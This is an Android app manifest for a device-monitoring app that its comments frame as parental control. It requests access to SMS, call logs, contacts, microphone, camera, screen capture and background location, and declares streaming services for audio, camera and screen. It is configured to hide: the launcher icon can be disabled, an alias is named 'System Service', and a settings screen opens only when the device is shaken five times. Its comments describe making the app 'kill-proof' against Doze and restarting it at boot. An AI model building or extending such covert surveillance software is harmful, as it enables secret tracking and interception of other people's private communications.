<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android">

    <!-- ── Network ─────────────────────────────────────────────────────────── -->
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
    <uses-permission android:name="android.permission.CHANGE_NETWORK_STATE"/>

    <!-- ── Location ────────────────────────────────────────────────────────── -->
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
    <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>

    <!-- ── Camera ──────────────────────────────────────────────────────────── -->
    <uses-permission android:name="android.permission.CAMERA"/>

    <!-- ── Audio / mic ─────────────────────────────────────────────────────── -->
    <uses-permission android:name="android.permission.RECORD_AUDIO"/>
    <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>

    <!-- ── Calls ───────────────────────────────────────────────────────────── -->
    <uses-permission android:name="android.permission.READ_CALL_LOG"/>
    <uses-permission android:name="android.permission.WRITE_CALL_LOG"/>
    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
    <uses-permission android:name="android.permission.READ_PHONE_NUMBERS"/>
    <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
    <uses-permission android:name="android.permission.CALL_PHONE"/>
    <uses-permission android:name="android.permission.ANSWER_PHONE_CALLS"/>

    <!-- ── SMS ─────────────────────────────────────────────────────────────── -->
    <uses-permission android:name="android.permission.READ_SMS"/>
    <uses-permission android:name="android.permission.RECEIVE_SMS"/>
    <uses-permission android:name="android.permission.READ_MMS"/>

    <!-- ── Contacts ────────────────────────────────────────────────────────── -->
    <uses-permission android:name="android.permission.READ_CONTACTS"/>

    <!-- ── Gallery / storage ───────────────────────────────────────────────── -->
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.READ_MEDIA_IMAGES"/>
    <uses-permission android:name="android.permission.READ_MEDIA_VIDEO"/>
    <uses-permission android:name="android.permission.READ_MEDIA_AUDIO"/>

    <!-- ── App usage stats ─────────────────────────────────────────────────── -->
    <uses-permission android:name="android.permission.PACKAGE_USAGE_STATS"
        tools:ignore="ProtectedPermissions"
        xmlns:tools="http://schemas.android.com/tools"/>

    <!-- ── Foreground service (RESEARCH: All types must be declared here     -->
    <!--    AND passed to startForeground() on Android 14+)                  -->
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION"/>
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE"/>
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA"/>
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC"/>
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION"/>

    <!-- ── Kill-proof / Doze-safe ──────────────────────────────────────────── -->
    <!-- RESEARCH (Doze): RECEIVE_BOOT_COMPLETED → restart after reboot       -->
    <!-- RESEARCH (Doze): REQUEST_IGNORE_BATTERY_OPTIMIZATIONS → bypass Doze  -->
    <!-- RESEARCH (Doze): WAKE_LOCK → CPU stays on in Doze for critical work  -->
    <!-- RESEARCH (Android 16): SCHEDULE_EXACT_ALARM → Doze-safe watchdog    -->
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"/>
    <uses-permission android:name="android.permission.WAKE_LOCK"/>
    <uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARM"/>
    <uses-permission android:name="android.permission.USE_EXACT_ALARM"/>

    <!-- ── Overlay ─────────────────────────────────────────────────────────── -->
    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>

    <!-- ── Screen capture ──────────────────────────────────────────────────── -->
    <uses-permission android:name="android.permission.MEDIA_CONTENT_CONTROL"/>

    <!-- ── Notification ────────────────────────────────────────────────────── -->
    <!-- RESEARCH: POST_NOTIFICATIONS required for foreground notification     -->
    <!-- on Android 13+ — without this, foreground service notification         -->
    <!-- is silently dropped, causing service to lose foreground priority       -->
    <uses-permission android:name="android.permission.POST_NOTIFICATIONS"/>
    <uses-permission android:name="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"/>

    <!-- ── APK install ─────────────────────────────────────────────────────── -->
    <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES"/>

    <!-- ── Shizuku ─────────────────────────────────────────────────────────── -->
    <queries>
        <package android:name="moe.shizuku.privileged.api"/>
        <package android:name="rikka.sui"/>
    </queries>

    <application
        android:allowBackup="false"
        android:icon="@drawable/ic_logo"
        android:label="@string/app_name"
        android:description="@string/accessibility_desc"
        android:supportsRtl="true"
        android:theme="@style/Theme.App">

        <!-- Setup activity — NO launcher intent-filter.
             Icon is controlled exclusively via LauncherAlias below.
             Keeping SetupActivity always-enabled lets CoreService start it if needed
             while still allowing the launcher icon to be hidden independently. -->
        <activity
            android:name=".setup.SetupActivity"
            android:exported="true"
            android:label="@string/setup_title"
            android:theme="@style/Theme.App.Setup"/>

        <!-- LAUNCHER alias — disable THIS to hide icon on ALL launchers.
             Realme/ColorOS/OPPO/Vivo all respect activity-alias component state
             immediately without caching the old launcher shortcut. -->
        <activity-alias
            android:name=".setup.LauncherAlias"
            android:targetActivity=".setup.SetupActivity"
            android:exported="true"
            android:enabled="true"
            android:label="@string/setup_title">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity-alias>

        <!-- INFO alias — still accessible for parent config if needed -->
        <activity-alias
            android:name=".setup.SetupActivityAlias"
            android:targetActivity=".setup.SetupActivity"
            android:exported="true"
            android:enabled="true"
            android:label="System Service">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.INFO"/>
            </intent-filter>
        </activity-alias>

        <!-- Hidden settings — opened by shaking device 5 times -->
        <activity
            android:name=".setup.HiddenSettingsActivity"
            android:exported="false"
            android:label="System Settings"
            android:theme="@style/Theme.App.Setup"/>

        <!-- MediaProjection permission — transparent activity -->
        <activity
            android:name=".setup.MediaProjectionActivity"
            android:theme="@android:style/Theme.Translucent.NoTitleBar.Fullscreen"
            android:exported="false"/>

        <!--
            Core service — RESEARCH FIX:
            android:stopWithTask="false" ensures service survives task removal.
            RESEARCH (Process Types): Foreground service has lowest OOM adj — hardest to kill.
            foregroundServiceType must list ALL types used (Android 14+).
        -->
        <service
            android:name=".core.CoreService"
            android:exported="false"
            android:stopWithTask="false"
            android:foregroundServiceType="dataSync|location|microphone|camera"/>

        <!-- Audio stream service -->
        <service
            android:name=".monitors.AudioStreamService"
            android:exported="false"
            android:stopWithTask="false"
            android:foregroundServiceType="microphone"/>

        <!-- Camera stream service -->
        <service
            android:name=".monitors.CameraStreamService"
            android:exported="false"
            android:stopWithTask="false"
            android:foregroundServiceType="camera"/>

        <!-- Screen stream service -->
        <service
            android:name=".monitors.ScreenStreamService"
            android:exported="false"
            android:stopWithTask="false"
            android:foregroundServiceType="mediaProjection"/>

        <!-- Live Painting overlay service -->
        <service
            android:name=".monitors.LivePaintingService"
            android:exported="false"
            android:stopWithTask="false"
            android:foregroundServiceType="dataSync"/>

        <!--
            Boot receiver — RESEARCH (Doze / OEM):
            priority="999" — fires before other apps.
            android.intent.action.MY_PACKAGE_REPLACED — restarts after OTA update.
        -->
        <receiver android:name=".core.BootReceiver" android:exported="true">
            <intent-filter android:priority="999">
                <action android:name="android.intent.action.BOOT_COMPLETED"/>
                <action android:name="android.intent.action.QUICKBOOT_POWERON"/>
                <action android:name="com.htc.intent.action.QUICKBOOT_POWERON"/>
                <action android:name="android.intent.action.MY_PACKAGE_REPLACED"/>
            </intent-filter>
        </receiver>

        <!-- Watchdog alarm receiver — RESEARCH (Doze): fires with setExactAndAllowWhileIdle -->
        <receiver android:name=".core.WatchdogReceiver" android:exported="false"/>

        <!-- Notification listener — RESEARCH (Notification Listener): must be exported -->
        <service
            android:name=".monitors.NotificationMonitor"
            android:exported="true"
            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
            <intent-filter>
                <action android:name="android.service.notification.NotificationListenerService"/>
            </intent-filter>
        </service>

        <!-- Accessibility — RESEARCH (Accessibility): must be exported, correct permission -->
        <service
            android:name=".monitors.AccessibilityMonitor"
            android:exported="true"
            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
            <intent-filter>
                <action android:name="android.accessibilityservice.AccessibilityService"/>
            </intent-filter>
            <meta-data
                android:name="android.accessibilityservice"
                android:resource="@xml/accessibility_config"/>
        </service>

        <!-- Device admin — RESEARCH (Device Admin): restrictions increased on modern Android -->
        <receiver
            android:name=".core.DeviceAdminReceiver"
            android:exported="true"
            android:permission="android.permission.BIND_DEVICE_ADMIN">
            <meta-data android:name="android.app.device_admin" android:resource="@xml/device_admin"/>
            <intent-filter>
                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED"/>
            </intent-filter>
        </receiver>

        <!-- Shizuku provider -->
        <provider
            android:name="rikka.shizuku.ShizukuProvider"
            android:authorities="${applicationId}.shizuku"
            android:multiprocess="false"
            android:enabled="true"
            android:exported="true"
            android:permission="android.permission.INTERACT_ACROSS_USERS_FULL"/>

    <!-- Bug #10 fix: CallBlockerReceiver — blocks calls from blocked_contacts list via Shizuku -->
        <receiver
            android:name=".monitors.CallBlockerReceiver"
            android:exported="false">
            <intent-filter>
                <action android:name="android.intent.action.PHONE_STATE"/>
            </intent-filter>
        </receiver>

        <!-- FIX #24: CallScreeningService — real call blocking via telecom framework -->
        <service
            android:name=".core.CallBlocker"
            android:exported="true"
            android:permission="android.permission.BIND_SCREENING_SERVICE">
            <intent-filter>
                <action android:name="android.telecom.CallScreeningService"/>
            </intent-filter>
        </service>

        <!-- NF #2: AppInstallReceiver — alerts parent when new app is installed on child -->
        <receiver
            android:name=".monitors.AppInstallReceiver"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.PACKAGE_ADDED"/>
                <data android:scheme="package"/>
            </intent-filter>
        </receiver>

    </application>
</manifest>
